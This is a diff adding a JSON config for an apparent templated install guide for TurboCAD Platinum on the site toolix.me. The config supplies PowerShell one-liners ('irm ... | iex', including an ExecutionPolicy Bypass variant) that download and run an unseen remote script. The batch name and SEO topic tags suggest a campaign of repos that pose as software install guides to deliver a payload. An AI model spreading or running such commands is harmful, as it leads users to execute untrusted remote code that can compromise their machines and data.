@@ -1,0 +1,27 @@
+{
+  "repo": "TurboCAD-Platinum",
+  "product": "TurboCAD Platinum",
+  "product_title": "TurboCAD Platinum",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "creative",
+  "topics": [
+    "how-to-install-turbocad-platinum",
+    "turbocad-platinum-app",
+    "creative-workflow",
+    "visual-design",
+    "design-software",
+    "image-editing",
+    "turbocad-platinum-windows-tool",
+    "turbocad-platinum-modeling-tool",
+    "turbocad-platinum",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
